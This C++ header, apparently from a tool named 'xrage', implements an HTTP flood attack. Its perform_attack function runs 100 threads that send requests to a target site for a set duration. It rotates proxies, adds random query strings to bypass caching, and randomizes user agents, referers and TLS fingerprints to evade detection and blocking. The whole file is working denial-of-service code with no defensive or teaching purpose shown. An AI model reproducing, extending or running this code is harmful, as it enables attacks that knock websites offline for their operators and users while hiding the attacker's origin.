#pragma once
#include "../core/proxy_rotator.hpp"
#include "../core/thread_pool.hpp"
#include "../utils/request_builder.hpp"
#include "../utils/stats_tracker.hpp"
#include "../utils/tls_fingerprint.hpp"

#include <curl/curl.h>
#include <atomic>
#include <chrono>

namespace xrage {

    inline void perform_attack(const std::string& target,
                               int port,
                               int duration,
                               ProxyRotator& proxy_rotator,
                               StatsTracker& stats,
                               int threads = 100) {
        ThreadPool pool(threads);
        auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(duration);

        auto fp = tls::get_random_fingerprint();
        tls::print_fingerprint_debug(fp);

        for (int i = 0; i < threads; ++i) {
            pool.enqueue([&, i]() {
                CURL* curl = curl_easy_init();
                if (!curl) return;

                while (std::chrono::steady_clock::now() < end_time) {
                    std::string proxy = proxy_rotator.get_next();
                    std::string url = "https://" + target + "/?" + std::to_string(rand());

                    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
                    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, 3000L);
                    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
                    curl_easy_setopt(curl, CURLOPT_USERAGENT, request::get_random_user_agent().c_str());
                    curl_easy_setopt(curl, CURLOPT_REFERER, request::get_random_referer(target).c_str());
                    curl_easy_setopt(curl, CURLOPT_PROXY, proxy.c_str());
                    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, +[](char*, size_t size, size_t nmemb, void*) {
                        return size * nmemb;
                    });

                    // Apply TLS version from fingerprint
                    if (fp.tls_version == "TLSv1.2") {
                        curl_easy_setopt(curl, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);
                    } else if (fp.tls_version == "TLSv1.3") {
                        curl_easy_setopt(curl, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_3);
                    }

                    CURLcode res = curl_easy_perform(curl);
                    if (res == CURLE_OK) {
                        stats.increment_sent();
                    } else {
                        stats.increment_error();
                    }
                }

                curl_easy_cleanup(curl);
            });
        }
    }

}